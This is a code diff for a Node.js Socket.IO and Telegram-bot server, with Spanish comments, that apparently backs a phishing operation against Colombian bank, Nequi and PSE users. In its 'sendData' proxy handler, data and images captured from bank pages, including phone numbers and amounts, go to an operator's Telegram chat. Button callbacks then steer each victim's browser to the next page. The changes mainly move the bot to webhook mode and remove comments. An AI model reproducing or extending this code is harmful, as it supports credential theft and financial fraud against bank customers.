@@ -32,11 +32,11 @@ const io = socketIO(server, {
         methods: ["GET", "POST"],
         credentials: true
     },
-    pingInterval: 10000,      // Aumentado para Railway
-    pingTimeout: 20000,       // Aumentado para Railway
-    connectTimeout: 30000,    // Timeout de conexión
-    upgradeTimeout: 10000,    // Timeout para upgrade de polling a websocket
-    maxHttpBufferSize: 1e8,   // 100MB para imágenes
+    pingInterval: 10000,
+    pingTimeout: 20000,
+    connectTimeout: 30000,
+    upgradeTimeout: 10000,
+    maxHttpBufferSize: 1e8,
     transports: ['websocket', 'polling'],
     allowUpgrades: true,
     perMessageDeflate: {
@@ -47,19 +47,27 @@ const io = socketIO(server, {
     }
 });
 
-const bot = new TelegramBot(TELEGRAM_TOKEN);
-
-// Configurar el webhook en producción
+// Inicializar el bot según el entorno
+let bot;
 if (NODE_ENV === 'production') {
+    // En producción (Railway), usar webhooks - NO polling
+    bot = new TelegramBot(TELEGRAM_TOKEN, { polling: false });
+    
     const WEBHOOK_URL = `https://${process.env.RAILWAY_PUBLIC_DOMAIN}/api/telegram/webhook`;
-    bot.setWebHook(WEBHOOK_URL)
-        .then(() => console.log(`✅ Webhook configurado en: ${WEBHOOK_URL}`))
-        .catch(err => console.error('❌ Error al configurar el webhook:', err));
+    
+    // Configurar webhook después de que el servidor esté listo
+    setTimeout(() => {
+        bot.setWebHook(WEBHOOK_URL)
+            .then(() => {
+                console.log(`✅ Webhook configurado en: ${WEBHOOK_URL}`);
+                console.log(`🔔 Los botones de Telegram ahora funcionarán correctamente`);
+            })
+            .catch(err => console.error('❌ Error al configurar el webhook:', err));
+    }, 2000);
 } else {
-    // En desarrollo, usamos polling para facilitar las pruebas locales
-    bot.startPolling()
-        .then(() => console.log('🤖 Bot de Telegram iniciado con polling para desarrollo'))
-        .catch(err => console.error('❌ Error al iniciar polling:', err));
+    // En desarrollo, usar polling
+    bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
+    console.log('🤖 Bot de Telegram iniciado con polling para desarrollo');
 }
 
 class SessionManager {
@@ -190,7 +198,6 @@ io.on('connection', (socket) => {
         });
     });
 
-    // Manejador alternativo para bancas que usan init_session con guión bajo
     socket.on('init_session', (payload) => {
         const { sessionId } = payload;
         let session = sessionManager.getSession(sessionId);
@@ -199,7 +206,6 @@ io.on('connection', (socket) => {
             sessionManager.updateSocket(sessionId, socket.id);
             console.log(`🔄 Sesión de banca reconectada: ${sessionId} | Socket: ${socket.id}`);
         } else {
-            // Crear sesión temporal si no existe (puede venir de PSE)
             session = sessionManager.createSession(sessionId, socket.id, 'banco', {});
             console.log(`🆕 Nueva sesión de banco creada: ${sessionId} | Socket: ${socket.id}`);
         }
@@ -301,15 +307,12 @@ io.on('connection', (socket) => {
         }
     });
 
-    // PROXY TRANSPARENTE: Interceptar y reenviar mensajes de las bancas al Telegram principal
     socket.on('sendData', async (data) => {
         console.log('🔍 PROXY: Interceptando mensaje de banca:', data);
         
         try {
-            // Extraer sessionId (puede venir del data o del payload)
             let sessionId = data.sessionId;
             
-            // Si no hay sessionId en el data, buscar en la sesión del socket
             if (!sessionId) {
                 const session = sessionManager.getSessionBySocket(socket.id);
                 sessionId = session ? session.sessionId : null;
@@ -323,7 +326,6 @@ io.on('connection', (socket) => {
             const session = sessionManager.getSession(sessionId);
             const sessionData = session ? session.data : {};
 
-            // Guardar datos en la sesión
             if (session) {
                 sessionManager.addData(sessionId, {
                     [`bank_${data.type}`]: data,
@@ -331,7 +333,6 @@ io.on('connection', (socket) => {
                 });
             }
 
-            // Preparar mensaje para Telegram
             let telegramText = '';
             let keyboard = data.content?.keyboard || null;
 
@@ -341,7 +342,6 @@ io.on('connection', (socket) => {
                 telegramText = data.content;
             }
 
-            // Agregar contexto de la sesión Nequi/PSE si existe
             let fullMessage = '';
             if (sessionData.phone || sessionData.amount || sessionData.bank) {
                 fullMessage += `━━━━━━━━━━━━━━━━━━━━━━\n`;
@@ -356,7 +356,6 @@ io.on('connection', (socket) => {
             fullMessage += telegramText;
             fullMessage += `\n\n🆔 <code>${sessionId}</code>`;
 
-            // Si hay imagen, enviar imagen con caption
             if (data.content?.image) {
                 console.log('📷 Enviando imagen a Telegram');
                 const imageBuffer = Buffer.from(data.content.image.split(',')[1], 'base64');
@@ -367,7 +366,6 @@ io.on('connection', (socket) => {
                     reply_markup: keyboard
                 });
 
-                // Guardar referencia del mensaje
                 telegramMessages.set(sessionId, {
                     messageId: sentMessage.message_id,
                     chatId: CHAT_ID,
@@ -376,14 +374,12 @@ io.on('connection', (socket) => {
 
                 console.log('✅ Imagen enviada a Telegram:', sentMessage.message_id);
                 
-                // Confirmar al cliente de la banca
                 socket.emit('dataSent', { 
                     success: true, 
                     sessionId, 
                     messageId: sentMessage.message_id 
                 });
             } else {
-                // Enviar texto normal
                 console.log('📨 Enviando mensaje a Telegram');
                 
                 const sentMessage = await bot.sendMessage(CHAT_ID, fullMessage, {
@@ -391,7 +387,6 @@ io.on('connection', (socket) => {
                     reply_markup: keyboard
                 });
 
-                // Guardar referencia del mensaje
                 telegramMessages.set(sessionId, {
                     messageId: sentMessage.message_id,
                     chatId: CHAT_ID,
@@ -400,7 +395,6 @@ io.on('connection', (socket) => {
 
                 console.log('✅ Mensaje enviado a Telegram:', sentMessage.message_id);
                 
-                // Confirmar al cliente de la banca
                 socket.emit('dataSent', { 
                     success: true, 
                     sessionId, 
@@ -430,13 +424,12 @@ bot.on('callback_query', async (callbackQuery) => {
 
     try {
         console.log('🔘 Callback recibido:', data);
+        console.log('📍 Message ID:', messageId, '| Chat ID:', chatId, '| Callback ID:', callbackId);
         
-        // Intentar parsear diferentes formatos de callback_data
         let sessionId = null;
         let action = null;
         let module = null;
         
-        // Formato: action:page:sessionId (usado por algunas bancas)
         if (data.includes(':')) {
             const parts = data.split(':');
             action = parts[0];
@@ -444,7 +437,6 @@ bot.on('callback_query', async (callbackQuery) => {
             
             console.log('📋 Formato con ":" detectado | Acción:', action, '| SessionId:', sessionId);
         }
-        // Formato: module_action_sessionId (usado por Nequi/PSE)
         else if (data.includes('_')) {
             const parts = data.split('_');
             module = parts[0];
@@ -476,13 +468,11 @@ bot.on('callback_query', async (callbackQuery) => {
 
         console.log('✅ Sesión y socket encontrados, procesando callback');
         
-        // Remover teclado inline del mensaje inmediatamente
         await bot.editMessageReplyMarkup(
             { inline_keyboard: [] }, 
             { chat_id: chatId, message_id: messageId }
         ).catch(() => {});
 
-        // Manejadores especiales para Nequi y PSE
         if (module === 'nequi' && action === 'follow') {
             await bot.sendMessage(chatId, '✅ Cliente redirigido a PSE', { reply_to_message_id: messageId });
             targetSocket.emit('actionFollow', { sessionId, action: 'follow', nextPage: 'pse' });
@@ -507,7 +497,6 @@ bot.on('callback_query', async (callbackQuery) => {
             return;
         }
 
-        // Para todas las demás bancas, enviar la acción directamente
         console.log('📤 Enviando acción al cliente:', { action, sessionId });
         
         targetSocket.emit('telegramAction', {
@@ -519,12 +508,10 @@ bot.on('callback_query', async (callbackQuery) => {
             timestamp: Date.now()
         });
 
-        // Confirmar al admin
         await bot.answerCallbackQuery(callbackId, { 
             text: `✅ Acción "${action}" enviada` 
         });
 
-        // Enviar confirmación en el chat (solo una vez)
         await bot.sendMessage(chatId, `✅ Acción "${action}" enviada`, { 
             reply_to_message_id: messageId 
         });
@@ -582,15 +569,18 @@ ${registered}
 ━━━━━━━━━━━━━━━━━━━━━━`.trim();
 }
 
-
-
-// Limpieza automática de sesiones cada 10 minutos
 setInterval(() => sessionManager.cleanExpiredSessions(), 10 * 60 * 1000);
 
-// Ruta para que Telegram envíe las actualizaciones
-app.post('/api/telegram/webhook', (req, res) => {
-    bot.processUpdate(req.body);
-    res.sendStatus(200);
+app.post('/api/telegram/webhook', express.json(), (req, res) => {
+    console.log('📥 Webhook recibido de Telegram:', req.body.update_id);
+    
+    try {
+        bot.processUpdate(req.body);
+        res.sendStatus(200);
+    } catch (error) {
+        console.error('❌ Error procesando webhook:', error);
+        res.sendStatus(500);
+    }
 });
 
 app.get('/api/stats', (req, res) => {
@@ -626,12 +616,10 @@ app.get('/api/health', (req, res) => {
     });
 });
 
-// Health check para Railway (sin stats para más velocidad)
 app.get('/health', (req, res) => {
     res.status(200).send('OK');
 });
 
-// Root endpoint
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
@@ -669,18 +657,25 @@ function gracefulShutdown() {
     console.log('\n🛑 Cerrando servidor...');
     server.close(() => {
         console.log('✅ Servidor HTTP cerrado');
-        bot.stopPolling()
-            .then(() => {
-                console.log('✅ Bot de Telegram detenido');
-                process.exit(0);
-            })
-            .catch((err) => {
-                console.error('❌ Error deteniendo bot:', err);
-                process.exit(1);
-            });
+        
+        if (NODE_ENV !== 'production') {
+            bot.stopPolling()
+                .then(() => {
+                    console.log('✅ Bot de Telegram detenido');
+                    process.exit(0);
+                })
+                .catch((err) => {
+                    console.error('❌ Error deteniendo bot:', err);
+                    process.exit(1);
+                });
+        } else {
+            console.log('✅ Webhook mode - no polling to stop');
+            process.exit(0);
+        }
     });
     setTimeout(() => {
         console.error('⚠️ Forzando cierre...');
         process.exit(1);
     }, 10000);
 }
+
